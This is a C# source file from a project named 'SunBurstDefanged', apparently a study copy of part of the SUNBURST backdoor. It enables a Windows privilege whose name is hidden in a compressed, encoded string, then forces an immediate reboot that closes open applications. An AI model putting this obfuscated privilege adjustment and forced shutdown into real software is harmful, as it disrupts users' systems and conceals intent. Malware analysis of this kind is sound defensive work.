using System;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Runtime.ConstrainedExecution;

namespace SunBurstDefanged
{
	public class NativeMethods
	{
		[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
		[DllImport("kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool CloseHandle(IntPtr handle);

		[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
		[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool AdjustTokenPrivileges([In] IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)][In] bool DisableAllPrivileges, [In] ref NativeMethods.TOKEN_PRIVILEGE NewState, [In] uint BufferLength, [In][Out] ref NativeMethods.TOKEN_PRIVILEGE PreviousState, [In][Out] ref uint ReturnLength);

		[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
		[DllImport("advapi32.dll", CharSet = CharSet.Unicode, EntryPoint = "LookupPrivilegeValueW", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool LookupPrivilegeValue([In] string lpSystemName, [In] string lpName, [In][Out] ref NativeMethods.LUID Luid);

		[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr GetCurrentProcess();

		[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
		[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool OpenProcessToken([In] IntPtr ProcessToken, [In] TokenAccessLevels DesiredAccess, [In][Out] ref IntPtr TokenHandle);

		[DllImport("advapi32.dll", CharSet = CharSet.Unicode, EntryPoint = "InitiateSystemShutdownExW", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool InitiateSystemShutdownEx([In] string lpMachineName, [In] string lpMessage, [In] uint dwTimeout, [MarshalAs(UnmanagedType.Bool)][In] bool bForceAppsClosed, [MarshalAs(UnmanagedType.Bool)][In] bool bRebootAfterShutdown, [In] uint dwReason);

		public static bool RebootComputer()
		{
			bool flag = false;
			bool result;
			try
			{
				bool newState = false;
				string privilege = ZipHelper.Unzip("C04NzigtSckvzwsoyizLzElNTwUA");
				if (!NativeMethods.SetProcessPrivilege(privilege, true, out newState))
				{
					result = flag;
				}
				else
				{
					flag = NativeMethods.InitiateSystemShutdownEx(null, null, 0U, true, true, 2147745794U);
					NativeMethods.SetProcessPrivilege(privilege, newState, out newState);
					result = flag;
				}
			}
			catch (Exception)
			{
				result = flag;
			}
			return result;
		}

		public static bool SetProcessPrivilege(string privilege, bool newState, out bool previousState)
		{
			bool flag = false;
			previousState = false;
			bool result;
			try
			{
				IntPtr zero = IntPtr.Zero;
				NativeMethods.LUID luid = default(NativeMethods.LUID);
				luid.LowPart = 0U;
				luid.HighPart = 0U;
				if (!NativeMethods.OpenProcessToken(NativeMethods.GetCurrentProcess(), TokenAccessLevels.Query | TokenAccessLevels.AdjustPrivileges, ref zero))
				{
					result = false;
				}
				else if (!NativeMethods.LookupPrivilegeValue(null, privilege, ref luid))
				{
					NativeMethods.CloseHandle(zero);
					result = false;
				}
				else
				{
					NativeMethods.TOKEN_PRIVILEGE token_PRIVILEGE = default(NativeMethods.TOKEN_PRIVILEGE);
					NativeMethods.TOKEN_PRIVILEGE token_PRIVILEGE2 = default(NativeMethods.TOKEN_PRIVILEGE);
					token_PRIVILEGE.PrivilegeCount = 1U;
					token_PRIVILEGE.Privilege.Luid = luid;
					token_PRIVILEGE.Privilege.Attributes = (newState ? 2U : 0U);
					uint num = 0U;
					NativeMethods.AdjustTokenPrivileges(zero, false, ref token_PRIVILEGE, (uint)Marshal.SizeOf(token_PRIVILEGE2), ref token_PRIVILEGE2, ref num);
					previousState = ((token_PRIVILEGE2.Privilege.Attributes & 2U) > 0U);
					flag = true;
					NativeMethods.CloseHandle(zero);
					result = flag;
				}
			}
			catch (Exception)
			{
				result = flag;
			}
			return result;
		}

		private const uint SE_PRIVILEGE_DISABLED = 0U;

		private const uint SE_PRIVILEGE_ENABLED = 2U;

		private const string ADVAPI32 = "advapi32.dll";

		private const string KERNEL32 = "kernel32.dll";

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct LUID
		{
			public uint LowPart;

			public uint HighPart;
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct LUID_AND_ATTRIBUTES
		{
			public NativeMethods.LUID Luid;

			public uint Attributes;
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct TOKEN_PRIVILEGE
		{
			public uint PrivilegeCount;

			public NativeMethods.LUID_AND_ATTRIBUTES Privilege;
		}
	}
}
